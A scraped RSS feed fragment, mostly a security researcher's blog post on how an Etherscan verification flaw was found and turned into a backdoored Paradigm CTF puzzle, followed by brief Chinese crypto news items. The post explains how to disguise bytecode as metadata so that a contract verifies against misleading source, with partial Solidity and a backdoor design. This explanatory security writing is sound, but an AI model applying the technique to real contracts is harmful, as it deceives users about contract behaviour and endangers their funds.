sizes=\"(min-width: 720px) 720px\"></figure><p>With this contract, the source code suggests that a simple <code>bytes</code> object should be returned when calling <code>example()</code>. However, if you actually try to call it, this happens.</p><pre><code>$ seth call 0x3cd2138cabfb03c8ed9687561a0ef5c9a153923f &apos;example()&apos;\nseth-rpc: {&quot;id&quot;:1,&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_call&quot;,&quot;params&quot;:[{&quot;data&quot;:&quot;0x54353f2f&quot;,&quot;to&quot;:&quot;0x3CD2138CAbfB03c8eD9687561a0ef5C9a153923f&quot;},&quot;latest&quot;]}\nseth-rpc: error:   code       -32000\nseth-rpc: error:   message    stack underflow (5 &lt;=&gt; 16)</code></pre><p>I had successfully discovered an 0day within Etherscan, and now I could verify contracts which behaved completely differently from what the source code suggested. Now I just needed to design a puzzle around it.</p><h1 id=\"a-false-start\">A false start</h1><p>Clearly, the puzzle would revolve around the idea that the source code as seen on Etherscan was not how the contract would actually behave. I also wanted to make sure that players couldn&apos;t simply replay transactions directly, so the solution had to be unique per-address. The best way to do this was obviously to require a signature.</p><p>But in what context would players be required to sign some data? My first design was a simple puzzle with a single public function. Players would call the function with a few inputs, sign the data to prove they came up with the solution, and if the inputs passed all the various checks then they would be marked as a solver. However, as I fleshed out this design over the next few hours, I quickly grew dissatisfied with how things were turning out. It was starting to become very clunky and inelegant, and I couldn&apos;t bear the idea of burning such an awesome 0day on a such a poorly designed puzzle.</p><p>Resigning myself to the fact that I wouldn&apos;t be able to finish this in time for Friday, I decided to sleep on it.</p><h1 id=\"pinball\">Pinball</h1><p>I continued trying to iterate on my initial design over the weekend, but made no more progress. It was like I&apos;d hit a wall with my current approach, and even though I didn&apos;t want to admit it, I knew that I&apos;d likely have to start over if I wanted something I&apos;d be satisfied with.</p><p>Eventually, I found myself reexamining the problem from first principles. What I wanted was a puzzle where players had to complete a knowledge check of sorts. However, there was no requirement that completing the knowledge check itself was the win condition. Rather, it could be one of many paths that the player is allowed to take. Perhaps players could rack up points throughout the puzzle, with the exploit providing some sort of bonus. The win condition would simply be the highest score, therefore indirectly encouraging use of the exploit.</p><p>I thought back to a challenge I designed last year, <a href=\"https://github.com/paradigm-operations/paradigm-ctf-2021/blob/master/lockbox/public/contracts/Lockbox.sol\">Lockbox</a>, which forced players to construct a single blob of data which would meet requirements imposed by six different contracts. The contracts would apply different constraints on the same bytes, forcing players to be clever in how they constructed their payload. I realized I wanted to do something similar here, where I would require players to submit a single blob of data and I would award points based on certain sections of data meeting specific requirements.</p><p>It was at this point that I realized I was basically describing <a href=\"https://archive.ooo/c/pinboooll/376/\">pinboooll</a>, a challenge I worked on during the finals of DEFCON CTF 2020. The gimmick with pinboooll was that when you executed the binary, execution would bounce around the control flow graph similar to how a ball bounces around in a pinball machine. By constructing the input correctly, you would be able to hit specific sections of code and rack up points. Of course, there was an exploit involved as well, but frankly speaking I&apos;d already forgotten what it was and I had no intention of trying to find it again. Besides, I already had my own exploit I wanted to use.</p><p>Since I was handling a live 0day here, I decided that I wanted to get the puzzle out as soon as possible, even if it meant compromising on how much of someone else&apos;s work I&apos;d be copying. In the end, I spent a few hours refreshing myself on how pinboooll worked and a few days re-implementing it in Solidity. This took care of the scaffolding of the puzzle, now I just had to integrate the exploit.</p><h1 id=\"weaponizing-an-0day\">Weaponizing an 0day</h1><p>My approach to getting Solidity to output the right bytes had always been to just load several constants and have Solidity emit the corresponding PUSH instructions. However, such arbitrary constants would likely be a huge red flag and I wanted something that would blend in slightly better. I also had to load all the constants in a row, which would be hard to explain in actual code.</p><p>Because I really only needed to hardcode two sequences of magic bytes (<code>0xa264...1220</code> and <code>0x6473...0033</code>) I decided to see if I could sandwich code between them, instead of a third constant. In the deployed contract, I would just swap out the sandwiched code with some other instructions.</p><pre><code class=\"language-solidity\">address a = 0xa264...1220;\n\nuint x = 1 + 1 + 1 + ... + 1;\n\naddress b = 0x6473...0033;</code></pre><p>After some experimentation, I found it would be possible, but only if the optimizer was enabled. Otherwise, Solidity emits too much value cleanup code. This was acceptable, so I moved on to refining the code itself.</p><p>I would only be able to modify the code within the two addresses, but it would be weird to see a dangling address at the end, so I decided to use them in conditionals instead. I also had to justify the need for the second conditional, so I threw in a little score bonus in the end. I made the first conditional check that the <code>tx.origin</code> matched a hardcoded value to give people the initial impression that there was no point pursuing this code path any further.</p><pre><code class=\"language-solidity\">if (tx.origin != 0x13378bd7CacfCAb2909Fa2646970667358221220) return true;\n\nstate.rand = 0x40;\nstate.location = 0x60;\n\nif (msg.sender != 0x64736F6c6343A0FB380033c82951b4126BD95042) return true;\n\nstate.baseScore += 1500;</code></pre><p>Now that the source code was all prepared, I had to write the actual backdoor. My backdoor would need to verify that the player triggered the exploit correctly, fail silently if they didn&apos;t, and award them a bonus if they did. I wanted to make sure the exploit couldn&apos;t be easily replayed, so I decided on simply requiring the player to sign their own address and to submit the signature in the transaction. For extra fun, I decided to require the signature to be located at offset 0x44 in the transaction data, where the ball would typically begin. This would require players to understand how ABI encoding works and to manually relocate the ball data elsewhere.</p><p>However, here I ran into a big problem: it&apos;s simply not possible to fit all of this logic into 31 bytes of hand-written assembly. Fortunately, after some consideration, I realized that I had another 31 bytes to play with. After all, the real embedded metadata contained another IPFS hash that Etherscan would also ignore.</p><p>After some code golfing, I arrived at a working backdoor. In the first IPFS hash, I would immediately pop off the address that just got pushed, then jump to to the second IPFS hash. There, I would hash the caller and partially set up the memory/stack for a call to <code>ecrecover</code>. Then I would jump back to the first IPFS hash where I finish setting up the stack and perform the call. Finally, I set the score multiplier to be equal to <code>(msg.sender == ecrecover()) * 0x40 + 1</code>, which meant that no additional branching was needed.</p><p>After code golfing the backdoor down to size, I tweeted out my Rinkeby address in order to get some testnet ETH from the faucet, and to drop a subtle hint to anyone watching Twitter that something might be coming. Then, I deployed the contract and verified it.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2021/10/image-12.png\" class=\"kg-image\" alt=\"Hiding in Plain Sight\" loading=\"lazy\" width=\"1362\" height=\"600\" srcset=\"https://samczsun.com/content/images/size/w600/2021/10/image-12.png 600w, https://samczsun.com/content/images/size/w1000/2021/10/image-12.png 1000w, https://samczsun.com/content/images/2021/10/image-12.png 1362w\" sizes=\"(min-width: 720px) 720px\"></figure><p>Now all that was left to do was wait for someone to <a href=\"https://medium.com/@kanewallmann_71759/an-untrustworthy-pinball-machine-d9dcd07882c\">discover</a> the backdoor that was hiding in plain sight.</p>","content:encodedSnippet":"I like challenging assumptions.\nI like trying to do the impossible, finding what others have missed, and blowing people's minds with things they never saw coming. Last year, I wrote a challenge for Paradigm CTF 2021 based on a very obscure Solidity bug. While one variation had been publicly disclosed, the vulnerability I exploited had never really been discussed. As a result, almost everyone who tried the challenge was stumped by the seemingly impossible nature of it.\nA few weeks ago, we were discussing plans around Paradigm CTF 2022 when Georgios tweeted out a teaser tweet. I thought it would be incredibly cool to drop a teaser challenge on the same day as the kickoff call. However, it couldn't just be any old teaser challenge. I wanted something out of this world, something that no one would see coming, something that pushed the limits of what people could even imagine. I wanted to write the first Ethereum CTF challenge that exploited an 0day.\n\n🟩 🏁 @paradigm_ctf 👀👀👀 \nw/ @samczsun @TylerCrimm @AmanGotchu @williamLberman pic.twitter.com/QCMCYBHNbs\n— Georgios Konstantopoulos (@gakonst) October 12, 2021\n\n\nHow It's Made: 0days\nAs security researchers, there are a few base assumptions we make in order to optimize our time. One is that the source code we're reading really did produce the contract we're analyzing. Of course, this assumption only holds if we're reading the source code from somewhere trusted, like Etherscan. Therefore, if I could figure out a way to have Etherscan verify something incorrectly, I would be able to design a really devious puzzle around it.\nIn order to figure out how to exploit Etherscan's contract verification system, I had to verify some contracts. I deployed a few contracts to Ropsten to play around with and tried verifying them. Immediately, I was greeted with the following screen.\n\nI selected the correct settings and moved onto the next screen. Here, I was asked to provide my contract source code.\n\nI put in the source code and clicked verify. Sure enough, my source code was now attached to my contract.\n\nNow that I knew how things worked, I could start playing around with the verification process. The first thing I tried was deploying a new contract with foo changed to bar and verifying that contract with the original source code. Unsurprisingly, Etherscan refused to verify my contract.\n\nHowever, when I manually compared the two bytecode outputs, I noticed something strange. Contract bytecode is supposed to be hex, but there was clearly some non-hex in there.\n\nI knew that Solidity appended contract metadata to the deployed bytecode, but I never really considered how it affects contract verification. Clearly, Etherscan was scanning through the bytecode for the metadata and then replacing it with a marker that said, \"Anything in this region is allowed to be different, and we'll still consider it the same bytecode.\"\nThis seemed like a promising lead for a potential 0day. If I could trick Etherscan into interpreting non-metadata as metadata, then I would be able to tweak my deployed bytecode in the region marked {ipfs} while still having it verify as the legitimate bytecode.\nThe easiest way I could think of to include some arbitrary bytecode in the creation transaction was to encode them as constructor arguments. Solidity encodes constructor arguments by appending their ABI-encoded forms directly onto the create transaction data.\n\nHowever, Etherscan was too smart, and excluded the constructor arguments from any sort of metadata sniffing. You can see that the constructor arguments are italicized, to indicate that they're separate from the code itself.\n\nThis meant I would need to somehow trick the Solidity compiler into emitting a sequence of bytes that I controlled, so I could make it resemble the embedded metadata. However, this seemed like a nightmare of a problem to solve, since I would have almost no control over the opcodes or bytes that Solidity chooses to use without some serious compiler wrangling, after which the source code would look extremely suspicious.\nI considered this problem for a while, until it hit me: it was actually extremely easy to cause Solidity to emit (almost) arbitrary bytes. The following code will cause Solidity to emit 32 bytes of 0xAA.\nbytes32 value = 0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;\nMotivated, I quickly wrote a small contract which would push a series of constants in such a way that Solidity would emit bytecode which exactly resembled the embedded metadata.\n\nTo my delight, Etherscan marked the presence of an IPFS hash in the middle of my contract, where no embedded metadata should ever be found.\n\nI quickly copied the expected bytecode and replaced the IPFS hash with some random bytes, then deployed the resulting contract. Sure enough, Etherscan considered the differing bytes business as usual, and allowed my contract to be verified.\n\nWith this contract, the source code suggests that a simple bytes object should be returned when calling example(). However, if you actually try to call it, this happens.\n$ seth call 0x3cd2138cabfb03c8ed9687561a0ef5c9a153923f 'example()'\nseth-rpc: {\"id\":1,\"jsonrpc\":\"2.0\",\"method\":\"eth_call\",\"params\":[{\"data\":\"0x54353f2f\",\"to\":\"0x3CD2138CAbfB03c8eD9687561a0ef5C9a153923f\"},\"latest\"]}\nseth-rpc: error:   code       -32000\nseth-rpc: error:   message    stack underflow (5 <=> 16)\nI had successfully discovered an 0day within Etherscan, and now I could verify contracts which behaved completely differently from what the source code suggested. Now I just needed to design a puzzle around it.\nA false start\nClearly, the puzzle would revolve around the idea that the source code as seen on Etherscan was not how the contract would actually behave. I also wanted to make sure that players couldn't simply replay transactions directly, so the solution had to be unique per-address. The best way to do this was obviously to require a signature.\nBut in what context would players be required to sign some data? My first design was a simple puzzle with a single public function. Players would call the function with a few inputs, sign the data to prove they came up with the solution, and if the inputs passed all the various checks then they would be marked as a solver. However, as I fleshed out this design over the next few hours, I quickly grew dissatisfied with how things were turning out. It was starting to become very clunky and inelegant, and I couldn't bear the idea of burning such an awesome 0day on a such a poorly designed puzzle.\nResigning myself to the fact that I wouldn't be able to finish this in time for Friday, I decided to sleep on it.\nPinball\nI continued trying to iterate on my initial design over the weekend, but made no more progress. It was like I'd hit a wall with my current approach, and even though I didn't want to admit it, I knew that I'd likely have to start over if I wanted something I'd be satisfied with.\nEventually, I found myself reexamining the problem from first principles. What I wanted was a puzzle where players had to complete a knowledge check of sorts. However, there was no requirement that completing the knowledge check itself was the win condition. Rather, it could be one of many paths that the player is allowed to take. Perhaps players could rack up points throughout the puzzle, with the exploit providing some sort of bonus. The win condition would simply be the highest score, therefore indirectly encouraging use of the exploit.\nI thought back to a challenge I designed last year, Lockbox, which forced players to construct a single blob of data which would meet requirements imposed by six different contracts. The contracts would apply different constraints on the same bytes, forcing players to be clever in how they constructed their payload. I realized I wanted to do something similar here, where I would require players to submit a single blob of data and I would award points based on certain sections of data meeting specific requirements.\nIt was at this point that I realized I was basically describing pinboooll, a challenge I worked on during the finals of DEFCON CTF 2020. The gimmick with pinboooll was that when you executed the binary, execution would bounce around the control flow graph similar to how a ball bounces around in a pinball machine. By constructing the input correctly, you would be able to hit specific sections of code and rack up points. Of course, there was an exploit involved as well, but frankly speaking I'd already forgotten what it was and I had no intention of trying to find it again. Besides, I already had my own exploit I wanted to use.\nSince I was handling a live 0day here, I decided that I wanted to get the puzzle out as soon as possible, even if it meant compromising on how much of someone else's work I'd be copying. In the end, I spent a few hours refreshing myself on how pinboooll worked and a few days re-implementing it in Solidity. This took care of the scaffolding of the puzzle, now I just had to integrate the exploit.\nWeaponizing an 0day\nMy approach to getting Solidity to output the right bytes had always been to just load several constants and have Solidity emit the corresponding PUSH instructions. However, such arbitrary constants would likely be a huge red flag and I wanted something that would blend in slightly better. I also had to load all the constants in a row, which would be hard to explain in actual code.\nBecause I really only needed to hardcode two sequences of magic bytes (0xa264...1220 and 0x6473...0033) I decided to see if I could sandwich code between them, instead of a third constant. In the deployed contract, I would just swap out the sandwiched code with some other instructions.\naddress a = 0xa264...1220;\n\nuint x = 1 + 1 + 1 + ... + 1;\n\naddress b = 0x6473...0033;\nAfter some experimentation, I found it would be possible, but only if the optimizer was enabled. Otherwise, Solidity emits too much value cleanup code. This was acceptable, so I moved on to refining the code itself.\nI would only be able to modify the code within the two addresses, but it would be weird to see a dangling address at the end, so I decided to use them in conditionals instead. I also had to justify the need for the second conditional, so I threw in a little score bonus in the end. I made the first conditional check that the tx.origin matched a hardcoded value to give people the initial impression that there was no point pursuing this code path any further.\nif (tx.origin != 0x13378bd7CacfCAb2909Fa2646970667358221220) return true;\n\nstate.rand = 0x40;\nstate.location = 0x60;\n\nif (msg.sender != 0x64736F6c6343A0FB380033c82951b4126BD95042) return true;\n\nstate.baseScore += 1500;\nNow that the source code was all prepared, I had to write the actual backdoor. My backdoor would need to verify that the player triggered the exploit correctly, fail silently if they didn't, and award them a bonus if they did. I wanted to make sure the exploit couldn't be easily replayed, so I decided on simply requiring the player to sign their own address and to submit the signature in the transaction. For extra fun, I decided to require the signature to be located at offset 0x44 in the transaction data, where the ball would typically begin. This would require players to understand how ABI encoding works and to manually relocate the ball data elsewhere.\nHowever, here I ran into a big problem: it's simply not possible to fit all of this logic into 31 bytes of hand-written assembly. Fortunately, after some consideration, I realized that I had another 31 bytes to play with. After all, the real embedded metadata contained another IPFS hash that Etherscan would also ignore.\nAfter some code golfing, I arrived at a working backdoor. In the first IPFS hash, I would immediately pop off the address that just got pushed, then jump to to the second IPFS hash. There, I would hash the caller and partially set up the memory/stack for a call to ecrecover. Then I would jump back to the first IPFS hash where I finish setting up the stack and perform the call. Finally, I set the score multiplier to be equal to (msg.sender == ecrecover()) * 0x40 + 1, which meant that no additional branching was needed.\nAfter code golfing the backdoor down to size, I tweeted out my Rinkeby address in order to get some testnet ETH from the faucet, and to drop a subtle hint to anyone watching Twitter that something might be coming. Then, I deployed the contract and verified it.\n\nNow all that was left to do was wait for someone to discover the backdoor that was hiding in plain sight.","dc:creator":"samczsun","content":"Most people trust, but how many people verify?","contentSnippet":"Most people trust, but how many people verify?","guid":"617acf9a5614960001a98527","isoDate":"2021-11-11T14:19:31.000Z","from":"https://samczsun.com/rss/","hashId":"182a0ebb08b15806bd972cc9ad181a2a"},{"title":"Dune 数据：Arbitrum vs. Optimism","link":"https://dune.com/blockworks_research/l2-comparison-dashboard","pubDate":"2022-12-14T04:20:34.000Z","author":"ChainFeeds","summary":"<p><strong>Chainfeeds 导读：</strong></p><p>Arbitrum 和 Optimism 两大以太坊 Layer2 数据对比分析，涉及交易费用、利润、链上活动、主要协议、桥接资金……</p>\n<p><strong>文章来源：</strong></p><p><a href=\"https://dune.com/blockworks_research/l2-comparison-dashboard\">https://dune.com/blockworks_research/l2-comparison-dashboard</a></p>\n<p><strong>文章作者：</strong></p><p>ChainFeeds</p><hr><h3>观点：</h3><p><strong>ChainFeeds：</strong>Optimism 和 Arbitrum 今日平均交易费用分别为 0.1134 和 0.078 美元，今日活跃钱包数量分别为 6158 和 6463。链上活动方面，L2 消耗的 Gas 费用呈波动上升趋势，12 月 12 日所有 L2 消耗的 Gas 占以太坊总 Gas 的 3.06%，其中 Optimism 和 Arbitrum 分别占 1.58% 和 0.78%。</p><a href=\"https://dune.com/blockworks_research/l2-comparison-dashboard\">内容来源</a><p><strong>ChainFeeds：</strong>生态项目方面，Optimism 上最活跃的协议（12 月 14 日）为 Perpetual Protocol V2、Uniswap V3、Velodrome、Pika Protocol V3（协议合约活动降序），而 Arbitrum 最活跃的协议为 Uniswap V3、Beacon、GMX、Odos。桥接资金方面，12 月以来两大 L2 都呈现小幅稳步流入的趋势。</p><a href=\"https://dune.com/blockworks_research/l2-comparison-dashboard\">内容来源</a>","id":"urn:uuid:04cef1fa-c789-d0d1-7e84-8ec5ebc5c99e","isoDate":"2022-12-14T04:20:34.000Z","from":"https://www.chainfeeds.xyz/rss","hashId":"eeced4d92922a7fcd6aad26739d668c5"},{"title":"【英文长推】一文了解 Arbitrum 生态期权交易所 Dopex","link":"https://twitter.com/0xTindorr/status/1602005092235894785","pubDate":"2022-12-14T04:35:52.000Z","author":"Tindorr","summary":"<p><strong>Chainfeeds 导读：</strong></p><p>一篇关于 Dopex 的详细介绍，包括 Dopex 的现有产品 SSOV（Single Staking Option Vault）和 Atlantic Straddle Vaults，未来发展，DPX 和 RDPX 双代币模型以及值得关注的关键数据。</p>\n<p><strong>文章来源：</strong></p><p><a href=\"https://twitter.com/0xTindorr/status/1602005092235894785\">https://twitter.com/0xTindorr/status/1602005092235894785</a></p>\n<p><strong>文章作者：</strong></p><p>Tindorr</p><hr>","id":"urn:uuid:a936a5b7-22e2-a1fe-1114-03f9afcbf394","isoDate":"2022-12-14T04:35:52.000Z","from":"https://www.chainfeeds.xyz/rss","hashId":"ec2c00cb0fd190a7cadcd0885d6eef06"},{"title":"zkSync 将两新版本的原计划发布时间均推迟 1 个季度","link":"https://twitter.com/zksync/status/1602687959517450240","pubDate":"2022-12-14T05:24:56.000Z","author":"ChainFeeds","summary":"<h3>zkSync 将两新版本的原计划发布时间均推迟 1 个季度</h3>\n<p>以太坊 ZK Rollup zkSync 宣布将 Fair Onboarding Alpha 版本从今年第 4 季度推迟到 2023 年 1 季度，将 Full Launch Alpha 版本从 2023 年第 1 季度推迟到 2023 年第 2 季度，为安全审计留下充足时间，安全审计预计将于 2023 年 1 月完成。</p>\n<p><a href=\"https://twitter.com/zksync/status/1602687959517450240\">内容来源</a></p><hr>","id":"urn:uuid:923111f2-9176-fc6a-e7ed-7efd133d2d1a","isoDate":"2022-12-14T05:24:56.000Z","from":"https://www.chainfeeds.xyz/rss","hashId":"548e661979a8297efc4ca75d3de7b298"}]